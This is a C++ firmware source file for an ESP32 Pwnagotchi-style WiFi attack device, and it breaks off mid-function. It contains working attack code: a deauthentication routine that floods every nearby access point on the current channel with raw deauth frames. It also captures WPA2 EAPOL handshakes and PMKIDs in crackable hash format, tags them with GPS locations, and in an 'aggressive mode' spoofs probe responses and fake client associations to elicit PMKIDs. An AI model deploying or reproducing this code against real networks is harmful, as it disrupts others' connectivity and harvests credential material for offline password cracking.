#include "pwn.h"
#include "identity.h"
#include "config.h"
#include "GPSAnalyse.h"
#include <Preferences.h>
#include <freertos/FreeRTOS.h>

// ========== Constants ==========
static constexpr unsigned long AWAY_THRESHOLD_MS = 120000;
static constexpr unsigned long PACKET_TIMEOUT_MS = 5000;
static constexpr uint8_t kDeauthFrameTemplate[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00
};

// ========== External C Functions ==========
extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, const void *buffer, int len);

// ========== Global State ==========
static GPSAnalyse GPS;
static bool hasGPS = false;
static portMUX_TYPE gRadioMux = portMUX_INITIALIZER_UNLOCKED;
static QueueHandle_t pktQueue = nullptr;
static QueueHandle_t frQueue = nullptr;

std::set<BeaconEntry> gRegisteredBeacons;
static std::set<String> known_macs;
static Environment env;
static DeviceConfig *config = getConfig();

// Pwngrid state
static uint64_t pwngrid_friends_tot = 0;
static uint64_t pwngrid_friends_run = 0;
static pwngrid_peer pwngrid_peers[255];
static String pwngrid_last_friend_name = "";
static uint64_t pwngrid_pwned_tot = 0;
static uint64_t pwngrid_pwned_run = 0;

// Packet reassembly
static String fullPacket = "";
static unsigned long fullPacketStartTime = 0;


// ========== Statistics Management ==========
void loadStats() {
    pwngrid_friends_tot = getFriendsTot();
    pwngrid_pwned_tot = getPwnedTot();
}

void saveStats() {
    setStats(pwngrid_friends_tot, pwngrid_pwned_tot);
}

// ========== WiFi Helpers ==========
int wifi_get_channel() {
    uint8_t primary;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&primary, &second);
    return primary;
}

void wifi_set_channel(int ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void MAC2str(const uint8_t mac[6], char *out) {
    sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static String macToString(const uint8_t mac[6]) {
    char buf[18];
    MAC2str(mac, buf);
    return String(buf);
}


// ========== Database Queue Workers ==========
static void dbFriendTask(void *pv) {
    pwngrid_peer item;
    for (;;) {
        if (xQueueReceive(frQueue, &item, portMAX_DELAY) == pdTRUE) {
            if (!mergeFriend(item, pwngrid_friends_tot)) {
                Serial.println("Merge failed for friend");
            }
        }
    }
}

static void dbPacketTask(void *pv) {
    packet_item_t item;
    for (;;) {
        if (xQueueReceive(pktQueue, &item, portMAX_DELAY) == pdTRUE) {
            if (!addPacket(item)) {
                Serial.println("Insert failed for packet");
            } else {
                Serial.println("Packet saved to DB");
            }
        }
    }
}

static void initDBWorkers() {
    frQueue = xQueueCreate(32, sizeof(pwngrid_peer));
    xTaskCreatePinnedToCore(dbFriendTask, "dbFriendTask", 4096, NULL, 1, NULL, 1);

    pktQueue = xQueueCreate(32, sizeof(packet_item_t));
    xTaskCreatePinnedToCore(dbPacketTask, "dbPacketTask", 4096, NULL, 1, NULL, 1);
}


// ========== Packet/Friend Enqueueing ==========
void enqueue_packet_from_sniffer(const uint8_t *pkt, size_t len, const uint8_t mac_bssid[6],
                                 const char *type, uint8_t channel) {
    if (!pktQueue) return;
    
    packet_item_t it;
    it.len = (len > MAX_PKT_SAVE) ? MAX_PKT_SAVE : len;
    memcpy(it.data, pkt, it.len);
    it.channel = channel;
    MAC2str(mac_bssid, it.bssid);
    strncpy(it.type, type, sizeof(it.type) - 1);
    it.type[sizeof(it.type) - 1] = 0;
    it.ts_ms = (int64_t)(esp_timer_get_time() / 1000);
    
    if (xQueueSend(pktQueue, &it, 0) != pdTRUE) {
        Serial.println("Failed enqueuing packet");
    } else {
        Serial.println("Packet added to queue");
    }
}

void enqueue_friend_from_sniffer(pwngrid_peer &a_friend) {
    if (!frQueue) return;
    
    if (xQueueSend(frQueue, &a_friend, 0) != pdTRUE) {
        Serial.println("Failed enqueuing friend");
    }
}


// ========== Pwngrid Getters ==========
uint64_t getPwngridTotalPeers() { return pwngrid_friends_tot; }
uint64_t getPwngridRunTotalPeers() { return pwngrid_friends_run; }
String getPwngridLastFriendName() { return pwngrid_last_friend_name; }
pwngrid_peer *getPwngridPeers() { return pwngrid_peers; }
uint64_t getPwngridTotalPwned() { return pwngrid_pwned_tot; }
uint64_t getPwngridRunPwned() { return pwngrid_pwned_run; }

signed int getPwngridClosestRssi() {
    signed int closest = -1000;
    for (uint8_t i = 0; i < pwngrid_friends_tot; i++) {
        if (!pwngrid_peers[i].gone && pwngrid_peers[i].rssi > closest) {
            closest = pwngrid_peers[i].rssi;
        }
    }
    return closest;
}

void checkPwngridGoneFriends() {
    unsigned long now = millis();
    for (uint8_t i = 0; i < pwngrid_friends_tot; i++) {
        if (now - pwngrid_peers[i].last_ping > AWAY_THRESHOLD_MS) {
            pwngrid_peers[i].gone = true;
        }
    }
}


// ========== Pwngrid Beacon Construction ==========
static const uint8_t pwngrid_beacon_raw[] = {
    0x80, 0x00,                                      // FC
    0x00, 0x00,                                      // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,              // DA (broadcast)
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,              // SA
    0xa1, 0x00, 0x64, 0xe6, 0x0b, 0x8b,              // BSSID
    0x40, 0x43,                                      // Sequence number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
    0x64, 0x00,                                      // Beacon interval
    0x11, 0x04,                                      // Capability info
};

esp_err_t pwngridAdvertise(uint8_t channel, String face) {
    DynamicJsonDocument pal_json(2048);
    auto id = ensurePwnIdentity(true);
    
    pal_json["pal"] = true;
    pal_json["name"] = getDeviceName();
    pal_json["face"] = face;
    pal_json["epoch"] = 1;
    pal_json["grid_version"] = GRID_VERSION;
    pal_json["identity"] = getFingerprintHex();
    pal_json["pwnd_run"] = pwngrid_pwned_run;
    pal_json["pwnd_tot"] = pwngrid_pwned_tot;
    pal_json["session_id"] = getSessionId();
    pal_json["timestamp"] = 0;
    pal_json["uptime"] = millis() / 1000;
    pal_json["version"] = PWNGRID_VERSION;
    pal_json["policy"]["advertise"] = true;
    pal_json["policy"]["bond_encounters_factor"] = 20000;
    pal_json["policy"]["bored_num_epoch"] = 0;
    pal_json["policy"]["sad_num_epoch"] = 0;
    pal_json["policy"]["excited_num_epoch"] = 9999;

    String pal_json_str;
    serializeJson(pal_json, pal_json_str);
    uint16_t pal_json_len = measureJson(pal_json);
    uint8_t header_len = 2 + ((pal_json_len / 255) * 2);
    
    uint8_t pwngrid_beacon_frame[sizeof(pwngrid_beacon_raw) + pal_json_len + header_len];
    memcpy(pwngrid_beacon_frame, pwngrid_beacon_raw, sizeof(pwngrid_beacon_raw));

    int frame_byte = sizeof(pwngrid_beacon_raw);
    for (int i = 0; i < pal_json_len; i++) {
        if (i % 255 == 0) {
            pwngrid_beacon_frame[frame_byte++] = 0xde;  // AC tag
            uint8_t payload_len = (pal_json_len - i < 255) ? (pal_json_len - i) : 255;
            pwngrid_beacon_frame[frame_byte++] = payload_len;
        }
        pwngrid_beacon_frame[frame_byte++] = isAscii(pal_json_str[i]) ? 
            (uint8_t)pal_json_str[i] : (uint8_t)'?';
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    delay(102);
    return esp_wifi_80211_tx(WIFI_IF_AP, pwngrid_beacon_frame, 
                            sizeof(pwngrid_beacon_frame), false);
}


// ========== Pwngrid Peer Management ==========
void pwngridAddPeer(DynamicJsonDocument &json, signed int rssi, int channel) {
    String identity = json["identity"].as<String>();

    // Check if peer already exists
    for (uint8_t i = 0; i < pwngrid_friends_run; i++) {
        if (pwngrid_peers[i].identity == identity) {
            pwngrid_peers[i].last_ping = millis();
            pwngrid_peers[i].gone = false;
            pwngrid_peers[i].rssi = rssi;
            return;
        }
    }

    // Add new peer
    pwngrid_peer &peer = pwngrid_peers[pwngrid_friends_run];
    peer.rssi = rssi;
    peer.last_ping = millis();
    peer.gone = false;
    peer.name = json["name"].as<String>();
    peer.face = json["face"].as<String>();
    peer.epoch = json["epoch"].as<int>();
    peer.grid_version = json["grid_version"].as<String>();
    peer.identity = identity;
    peer.pwnd_run = json["pwnd_run"].as<int>();
    peer.pwnd_tot = json["pwnd_tot"].as<int>();
    peer.session_id = json["session_id"].as<String>();
    peer.timestamp = json["timestamp"].as<int>();
    peer.uptime = json["uptime"].as<int>();
    peer.version = json["version"].as<String>();
    peer.channel = channel;

    pwngrid_last_friend_name = peer.name;
    Serial.println("pwngrid_last_friend_name: " + pwngrid_last_friend_name);

    // Add GPS coordinates if available
    if (hasGPS && GPS.isConnected() && GPS.hasValidFix()) {
        GPS.upDate();
        peer.latitude = GPS.s_GNRMC.Latitude;
        peer.longitude = GPS.s_GNRMC.Longitude;
        peer.has_gps = true;
        
        // Convert to proper format based on hemisphere
        if (GPS.s_GNRMC.LatitudeMark == 'S') {
            peer.latitude = -peer.latitude;
        }
        if (GPS.s_GNRMC.LongitudeMark == 'W') {
            peer.longitude = -peer.longitude;
        }
        
        Serial.printf("📍 Spotted %s at: Lat=%.6f, Lon=%.6f (Fix: %c)\n",
                     peer.name.c_str(), peer.latitude, peer.longitude, GPS.s_GNRMC.State);
    } else {
        peer.has_gps = false;
        if (hasGPS && !GPS.isConnected()) {
            Serial.println("⚠️  GPS not connected - no coordinates saved");
        } else if (hasGPS && !GPS.hasValidFix()) {
            Serial.println("⚠️  GPS has no fix - waiting for satellites...");
        }
    }

    enqueue_friend_from_sniffer(peer);
    pwngrid_friends_run++;
    saveStats();
}


// ========== Frame Type Detection ==========
typedef struct {
    int16_t fctl;
    int16_t duration;
    uint8_t da;
    uint8_t sa;
    uint8_t bssid;
    int16_t seqctl;
    unsigned char payload[];
} __attribute__((packed)) WifiMgmtHdr;

typedef struct {
    uint8_t payload[0];
    WifiMgmtHdr hdr;
} wifi_ieee80211_packet_t;

static inline bool isBeacon(const uint8_t *frame) {
    uint8_t type = (frame[0] >> 2) & 0x03;
    uint8_t subtype = (frame[0] >> 4) & 0x0F;
    return (type == 0 && subtype == 8);
}

static inline bool isProbeResp(const uint8_t *frame) {
    uint8_t type = (frame[0] >> 2) & 0x03;
    uint8_t subtype = (frame[0] >> 4) & 0x0F;
    return (type == 0 && subtype == 5);
}

static inline bool isProbeRequest(const uint8_t *f) {
    uint8_t type = (f[0] >> 2) & 0x03;
    uint8_t subtype = (f[0] >> 4) & 0x0F;
    return (type == 0 && subtype == 4);
}

static void getMAC(char *addr, uint8_t *data, uint16_t offset) {
    sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", 
            data[offset + 0], data[offset + 1], data[offset + 2], 
            data[offset + 3], data[offset + 4], data[offset + 5]);
}


// ========== EAPOL & PMKID Detection ==========
static bool isEapol(const uint8_t *buf, int len) {
    if (len < 40) return false;
    uint8_t type = (buf[0] >> 2) & 0x03;
    if (type != 2) return false;  // Must be data frame

    const uint8_t snap_hdr[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    for (int i = 0; i < 8; i++) {
        if (buf[24 + i] != snap_hdr[i]) return false;
    }
    return true;
}


static String formatPMKID(const uint8_t pmkid[16], const uint8_t ap_mac[6],
                         const uint8_t client_mac[6], const String &ssid) {
    char buf[256];
    char pmkid_hex[33];
    
    for (int i = 0; i < 16; i++)
        sprintf(&pmkid_hex[i * 2], "%02x", pmkid[i]);
    
    snprintf(buf, sizeof(buf), "%s*%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*%s",
             pmkid_hex,
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
             client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
             ssid.c_str());
    
    return String(buf);
}


static bool extractPMKID(const uint8_t *frame, int len, uint8_t pmkid_out[16],
                        uint8_t ap_mac_out[6], uint8_t client_mac_out[6]) {
    if (!isEapol(frame, len)) return false;

    memcpy(ap_mac_out, frame + 16, 6);      // addr3 = AP
    memcpy(client_mac_out, frame + 10, 6);  // addr2 = client

    int pos = 24 + 8;  // after SNAP header
    if (pos + 95 >= len) return false;

    uint8_t key_descriptor = frame[pos + 1];
    if (key_descriptor != 2) return false;  // Not WPA2

    int key_data_len = (frame[pos + 97] << 8) | frame[pos + 98];
    int key_data_start = pos + 99;
    if (key_data_start + key_data_len > len) return false;

    // Scan IEs inside Key Data
    int ie_pos = key_data_start;
    while (ie_pos + 2 < len && ie_pos < key_data_start + key_data_len) {
        uint8_t id = frame[ie_pos];
        uint8_t ie_len = frame[ie_pos + 1];

        if (id == 0x30) {  // RSN IE
            int rsn_end = ie_pos + 2 + ie_len;
            int p = ie_pos + 2;

            while (p + 18 <= rsn_end) {
                if (frame[p] == 0x00 && frame[p + 1] == 0x01) {
                    memcpy(pmkid_out, frame + p + 2, 16);
                    return true;
                }
                p++;
            }
        }
        ie_pos += 2 + ie_len;
    }
    return false;
}


// ========== MAC Generation & SSID Extraction ==========
static void generateFakeApMac(uint8_t mac_out[6]) {
    mac_out[0] = 0x02;  // locally administered
    for (int i = 1; i < 6; i++) {
        mac_out[i] = esp_random() & 0xFF;
    }
}

static void generateFakeClientMac(uint8_t mac_out[6]) {
    mac_out[0] = 0x0A;  // locally administered
    for (int i = 1; i < 6; i++) {
        mac_out[i] = esp_random() & 0xFF;
    }
}

static String extractSSIDfromProbe(const uint8_t *frame, int len) {
    int pos = 24;
    while (pos + 2 < len) {
        uint8_t tag = frame[pos];
        uint8_t tag_len = frame[pos + 1];
        if (tag == 0) {  // SSID
            if (tag_len == 0) return "";
            return String((char *)&frame[pos + 2], tag_len);
        }
        pos += 2 + tag_len;
    }
    return "";
}

static String extractSSIDfromAP(const uint8_t *frame, int len) {
    int pos = 36;  // beacon header
    while (pos + 2 < len) {
        uint8_t tag = frame[pos];
        uint8_t tag_len = frame[pos + 1];
        if (tag == 0) {  // SSID
            return String((char *)&frame[pos + 2], tag_len);
        }
        pos += 2 + tag_len;
    }
    return "";
}

static void getApMac(const uint8_t *frame, uint8_t mac_out[6]) {
    memcpy(mac_out, frame + 16, 6);  // addr3
}

static String extractClientfromProbe(const uint8_t *frame) {
    return macToString(frame + 10);  // addr2
}


// ========== Frame Transmission Helpers ==========
static void sendAuthReq(const uint8_t ap_mac[6], const uint8_t client_mac[6]) {
    uint8_t frame[30];
    int pos = 0;

    frame[pos++] = 0xB0; frame[pos++] = 0x00;  // Auth frame
    frame[pos++] = 0; frame[pos++] = 0;        // Duration
    
    memcpy(frame + pos, ap_mac, 6); pos += 6;       // dest = AP
    memcpy(frame + pos, client_mac, 6); pos += 6;   // src = fake client
    memcpy(frame + pos, ap_mac, 6); pos += 6;       // BSSID
    
    frame[pos++] = 0; frame[pos++] = 0;  // seq/frag
    frame[pos++] = 0x00; frame[pos++] = 0x00;  // auth algo = open
    frame[pos++] = 0x01; frame[pos++] = 0x00;  // seq num
    frame[pos++] = 0x00; frame[pos++] = 0x00;  // status

    esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
}


static void sendAssocReq(const uint8_t ap_mac[6], const uint8_t client_mac[6], const char *ssid) {
    uint8_t frame[256];
    int pos = 0;

    frame[pos++] = 0x00; frame[pos++] = 0x00;  // assoc request
    frame[pos++] = 0; frame[pos++] = 0;        // Duration

    memcpy(frame + pos, ap_mac, 6); pos += 6;
    memcpy(frame + pos, client_mac, 6); pos += 6;
    memcpy(frame + pos, ap_mac, 6); pos += 6;

    frame[pos++] = 0; frame[pos++] = 0;          // frag/seq
    frame[pos++] = 0x31; frame[pos++] = 0x04;    // capabilities
    frame[pos++] = 0x64; frame[pos++] = 0;       // listen interval

    int ssid_len = strlen(ssid);
    frame[pos++] = 0x00;
    frame[pos++] = ssid_len;
    memcpy(frame + pos, ssid, ssid_len);
    pos += ssid_len;

    const uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
    frame[pos++] = 0x01;
    frame[pos++] = sizeof(rates);
    memcpy(frame + pos, rates, sizeof(rates));
    pos += sizeof(rates);

    esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
}


static void sendProbeResp(wifi_interface_t ifx, const uint8_t client_mac[6],
                         const uint8_t ap_mac[6], const char *ssid) {
    uint8_t frame[256];
    int pos = 0;

    // Frame Control
    frame[pos++] = 0x50; frame[pos++] = 0x00;  // Probe response
    frame[pos++] = 0x00; frame[pos++] = 0x00;  // Duration

    // Addresses
    memcpy(&frame[pos], client_mac, 6); pos += 6;  // dest
    memcpy(&frame[pos], ap_mac, 6); pos += 6;      // source
    memcpy(&frame[pos], ap_mac, 6); pos += 6;      // BSSID

    frame[pos++] = 0x00; frame[pos++] = 0x00;  // seq/frag

    // Timestamp (8 bytes)
    for (int i = 0; i < 8; i++) frame[pos++] = 0x00;

    // Beacon interval
    frame[pos++] = 0x64; frame[pos++] = 0x00;
    
    // Capabilities
    frame[pos++] = 0x21; frame[pos++] = 0x04;

    // SSID element
    int ssid_len = strlen(ssid);
    frame[pos++] = 0x00;
    frame[pos++] = ssid_len;
    memcpy(&frame[pos], ssid, ssid_len);
    pos += ssid_len;

    // Supported Rates
    const uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
    frame[pos++] = 0x01;
    frame[pos++] = sizeof(rates);
    memcpy(&frame[pos], rates, sizeof(rates));
    pos += sizeof(rates);

    // DS Params
    frame[pos++] = 0x03;
    frame[pos++] = 1;
    frame[pos++] = 6;  // channel 6

    // RSN IE (WPA2-PSK)
    const uint8_t rsn_ie[] = {
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
        0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f,
        0xac, 0x02, 0x00, 0x00
    };
    memcpy(&frame[pos], rsn_ie, sizeof(rsn_ie));
    pos += sizeof(rsn_ie);

    esp_wifi_80211_tx(ifx, frame, pos, false);
}


// ========== Packet Handler ==========
static void handlePacket(wifi_promiscuous_pkt_t *snifferPacket) {
    const uint8_t *frame = snifferPacket->payload;
    int pkt_len = snifferPacket->rx_ctrl.sig_len ? snifferPacket->rx_ctrl.sig_len : 300;
    int rx_channel = snifferPacket->rx_ctrl.channel;

    // Track MAC addresses
    char addr[18];
    getMAC(addr, (uint8_t *)frame, 10);
    String mac = String(addr);
    if (known_macs.find(mac) == known_macs.end()) {
        known_macs.insert(mac);
        env.new_aps_found++;
        env.ap_count++;
    }

    // Track beacons
    uint16_t frameCtrl = frame[0] | (frame[1] << 8);
    uint8_t frameType = (frameCtrl & 0x0C) >> 2;
    uint8_t frameSubtype = (frameCtrl & 0xF0) >> 4;
    
    if (frameType == 0x00 && frameSubtype == 0x08) {  // Beacon
        BeaconEntry entry;
        memcpy(entry.mac, frame + 10, sizeof(entry.mac));
        entry.channel = wifi_get_channel();
        portENTER_CRITICAL(&gRadioMux);
        gRegisteredBeacons.insert(entry);
        portEXIT_CRITICAL(&gRadioMux);
    }

    // Check for EAPOL
    bool hasEapol = false;
    if (pkt_len > 34) {
        if ((frame[30] == 0x88 && frame[31] == 0x8e) || 
            (frame[32] == 0x88 && frame[33] == 0x8e)) {
            hasEapol = true;
        }
    }

    if (hasEapol) {
        Serial.println("We have EAPOL");
        drawMood(pwnagotchi_moods[10], "I love EAPOLs!", false, 
                 getPwngridLastFriendName(), getPwngridClosestRssi());

        env.eapol_packets++;
        env.got_handshake = true;
        env.last_handshake_time = millis();
        pwngrid_pwned_run++;
        pwngrid_pwned_tot++;
        saveStats();

        if (pkt_len >= 24) {
            // Extract BSSID
            uint16_t fc = frame[0] | (frame[1] << 8);
            uint8_t fc_type = (fc >> 2) & 0x3;
            bool toDS = fc & 0x0100;
            bool fromDS = fc & 0x0200;

            uint8_t bssid[6];
            if (fc_type == 0) {  // management
                memcpy(bssid, frame + 16, 6);
            } else if (fc_type == 2) {  // data
                if (!toDS && fromDS) {
                    memcpy(bssid, frame + 10, 6);
                } else if (toDS && !fromDS) {
                    memcpy(bssid, frame + 16, 6);
                } else if (toDS && fromDS && pkt_len >= 30) {
                    memcpy(bssid, frame + 24, 6);
                } else {
                    memcpy(bssid, frame + 16, 6);
                }
            } else {
                memcpy(bssid, frame + 16, 6);
            }
            enqueue_packet_from_sniffer(frame, pkt_len, bssid, "EAPOL", rx_channel);
        }
    }

    // Check for PMKID
    uint8_t pmkid[16], ap_mac[6], client_mac[6];
    if (extractPMKID(frame, pkt_len, pmkid, ap_mac, client_mac)) {
        String ssid = extractSSIDfromAP(frame, pkt_len);
        String formatted = formatPMKID(pmkid, ap_mac, client_mac, ssid);
        Serial.print("[PMKID] ");
        Serial.println(formatted);
        env.got_pmkid = true;
        enqueue_packet_from_sniffer(frame, 16, ap_mac, "PMKID", rx_channel);
    }

    // Aggressive mode attacks
    if (getEnv().action == AGGRESSIVE_MODE) {
        if (isProbeRequest(frame) && (esp_random() % 100) == 7) {
            String ssid = extractSSIDfromProbe(frame, pkt_len);
            if (ssid.length() > 0) {
                uint8_t fake_ap[6];
                generateFakeApMac(fake_ap);
                const uint8_t *client_mac_raw = frame + 10;
                sendProbeResp(WIFI_IF_AP, client_mac_raw, fake_ap, ssid.c_str());
            }
        }

        if ((isBeacon(frame) || isProbeResp(frame)) && (esp_random() % 100) == 7) {
            String ssid = extractSSIDfromAP(frame, pkt_len);
            if (ssid.length() > 0) {
                uint8_t ap_mac[6], fake_client[6];
                getApMac(frame, ap_mac);
                generateFakeClientMac(fake_client);
                sendAuthReq(ap_mac, fake_client);
                vTaskDelay(10 / portTICK_PERIOD_MS);
                sendAssocReq(ap_mac, fake_client, ssid.c_str());
            }
        }
    }
}


// ========== Pwngrid Packet Reassembly ==========
static void processPwngridBeacon(wifi_promiscuous_pkt_t *snifferPacket) {
    int raw_len = snifferPacket->rx_ctrl.sig_len;
    int len = raw_len - 4;
    
    if (len < 0 || len > 4096 || len < 36) return;

    const uint8_t *p = snifferPacket->payload;
    int i = 36;  // Start of tagged parameters

    while (i + 2 <= len - 1) {
        uint8_t ie_id = p[i];
        uint8_t ie_len = p[i + 1];

        if (i + 2 + ie_len > len) break;  // Malformed IE

        String ie_data;
        ie_data.reserve(ie_len + 1);
        for (int k = 0; k < ie_len; ++k) {
            ie_data += (char)p[i + 2 + k];
        }

        if (ie_data.indexOf('{') == 0) {
            fullPacket = ie_data;
            fullPacketStartTime = millis();

            if (ie_data.length() > 0 && ie_data[ie_data.length() - 1] == '}') {
                DynamicJsonDocument sniffed_json(4096);
                if (deserializeJson(sniffed_json, fullPacket.c_str()) == DeserializationError::Ok) {
                    sniffed_json["rssi"] = snifferPacket->rx_ctrl.rssi;
                    sniffed_json["channel"] = snifferPacket->rx_ctrl.channel;
                    pwngridAddPeer(sniffed_json, snifferPacket->rx_ctrl.rssi, snifferPacket->rx_ctrl.channel);
                }
                fullPacket = "";
            }
        } else if (fullPacket.length() > 0) {
            if (millis() - fullPacketStartTime > PACKET_TIMEOUT_MS) {
                fullPacket = "";
                return;
            }
            
            fullPacket.concat(ie_data);
            if (ie_data.length() > 0 && ie_data[ie_data.length() - 1] == '}') {
                DynamicJsonDocument sniffed_json(4096);
                if (deserializeJson(sniffed_json, fullPacket.c_str()) == DeserializationError::Ok) {
                    sniffed_json["rssi"] = snifferPacket->rx_ctrl.rssi;
                    sniffed_json["channel"] = snifferPacket->rx_ctrl.channel;
                    pwngridAddPeer(sniffed_json, snifferPacket->rx_ctrl.rssi, snifferPacket->rx_ctrl.channel);
                }
                fullPacket = "";
            }
        }
        i += 2 + ie_len;
    }
}

// ========== Promiscuous Sniffer Callback ==========
void pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;

    // Handle EAPOL/PMKID detection if in AI mode
    if (config->personality == AI) {
        handlePacket(snifferPacket);
    }

    // Detect Pwngrid beacons
    if (snifferPacket->payload[0] == 0x80) {  // Beacon frame
        char addr[18];
        getMAC(addr, snifferPacket->payload, 10);
        
        if (String(addr) == "de:ad:be:ef:de:ad") {
            processPwngridBeacon(snifferPacket);
        }
    }
}

static const wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};


// ========== Initialization ==========
void initPwning() {
    Serial.println("Init Pwning processes");
    env.reset();
    loadStats();
    initDB();
    initDBWorkers();

    // Initialize GPS with device-specific pins
    // M5Stack GPS modules typically use Grove port or Hat connector
    hasGPS = false;
    
    #if defined(ARDUINO_M5STACK_STICKC) || defined(ARDUINO_M5STACK_STICKC_PLUS) || defined(ARDUINO_M5STACK_STICKC_PLUS2)
        // M5StickC/Plus: Grove port (G32=RX, G33=TX) or Hat (G0=RX, G26=TX)
        // Try Grove port first (most common for GPS Hat)
        Serial.println("GPS: Trying StickC Grove port (G32/G33)");
        if (GPS.begin(32, 33, 9600)) {
            GPS.start();
            hasGPS = true;
            Serial.println("GPS: Initialized on Grove port");
        } else {
            // Try Hat connector
            Serial.println("GPS: Trying StickC Hat port (G0/G26)");
            if (GPS.begin(0, 26, 9600)) {
                GPS.start();
                hasGPS = true;
                Serial.println("GPS: Initialized on Hat port");
            }
        }
    #elif defined(ARDUINO_M5STACK_ATOMS3)
        // AtomS3: Atomic GPS Base uses Grove (G2=RX, G1=TX)
        Serial.println("GPS: Trying AtomS3 Grove port (G2/G1)");
        if (GPS.begin(2, 1, 9600)) {
            GPS.start();
            hasGPS = true;
            Serial.println("GPS: Initialized on AtomS3 Grove");
        }
    #elif defined(ARDUINO_M5STACK_CARDPUTER)
        // Cardputer: Grove port A (G1=RX, G2=TX)
        Serial.println("GPS: Trying Cardputer Grove A (G1/G2)");
        if (GPS.begin(1, 2, 9600)) {
            GPS.start();
            hasGPS = true;
            Serial.println("GPS: Initialized on Cardputer Grove A");
        }
    #else
        // Generic ESP32: Try common pins
        Serial.println("GPS: Trying generic pins (G16/G17)");
        if (GPS.begin(16, 17, 9600)) {
            GPS.start();
            hasGPS = true;
            Serial.println("GPS: Initialized on generic pins");
        }
    #endif
    
    if (!hasGPS) {
        Serial.println("GPS: No GPS module detected - continuing without GPS");
    }

    auto id = ensurePwnIdentity(true);
    setDeviceName(id.name.c_str());
    esp_log_level_set("wifi", ESP_LOG_NONE);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_APSTA);

    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);

    // Initialize stealth AP interface
    wifi_config_t ap_cfg = {0};
    ap_cfg.ap.ssid_len = 0;
    ap_cfg.ap.channel = 6;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 0;
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    esp_wifi_start();
    esp_wifi_set_channel(random(1, 14), WIFI_SECOND_CHAN_NONE);
    delay(1);
    Serial.println("Pwngrid initialised.");
}

// ========== Frame Transmission ==========
esp_err_t sendRawFrame(wifi_interface_t ifx, const void *frame, int len, const char *tag) {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);

    if (mode == WIFI_MODE_STA || mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
        esp_err_t err = esp_wifi_internal_tx(ifx, frame, len);
        if (err == ESP_OK) return ESP_OK;
        Serial.println("internal_tx failed, falling back to 80211_tx");
    }

    esp_err_t err = esp_wifi_80211_tx(ifx, frame, len, false);
    if (err != ESP_OK) {
        Serial.printf("80211_tx failed: %d\n", err);
    }
    return err;
}

// ========== Deauth Operations ==========
void performDeauthCycle() {
    Serial.println("Performing deauth");
    
    std::vector<BeaconEntry> snapshot;
    snapshot.reserve(gRegisteredBeacons.size());
    
    portENTER_CRITICAL(&gRadioMux);
    std::copy(gRegisteredBeacons.begin(), gRegisteredBeacons.end(), 
              std::back_inserter(snapshot));
    portEXIT_CRITICAL(&gRadioMux);

    if (snapshot.empty()) {
        Serial.println("Snapshot empty, returning");
        return;
    }

    uint8_t originalChannel = wifi_get_channel();

    for (const auto &entry : snapshot) {
        if (entry.channel != originalChannel) continue;
        
        uint8_t frame[sizeof(kDeauthFrameTemplate)];
        memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
        memcpy(frame + 10, entry.mac, 6);
        memcpy(frame + 16, entry.mac, 6);

        esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE);
        Serial.printf("Sending three magic packets to: %02x:%02x:%02x:%02x:%02x:%02x\n",
                     entry.mac[0], entry.mac[1], entry.mac[2], 
                     entry.mac[3], entry.mac[4], entry.mac[5]);

        for (int i = 0; i < 3; ++i) {
            esp_err_t err = sendRawFrame(WIFI_IF_AP, frame, sizeof(frame), "Deauth");
            if (err != ESP_OK) {
                Serial.println("Deauth tx failed");
            }
        }
    }

    esp_wifi_set_channel(originalChannel, WIFI_SECOND_CHAN_NONE);
}

// ========== GPS Functions ==========
bool hasGPSModule() {
    return hasGPS;
}

bool isGPSConnected() {
    return hasGPS && GPS.isConnected();
}

bool hasGPSFix() {
    return hasGPS && GPS.isConnected() && GPS.hasValidFix();
}

void getGPSCoordinates(double &lat, double &lon) {
    if (!hasGPSFix()) {
        lat = 0.0;
        lon = 0.0;
        return;
    }
    
    GPS.upDate();
    lat = GPS.s_GNRMC.Latitude;
    lon = GPS.s_GNRMC.Longitude;
    
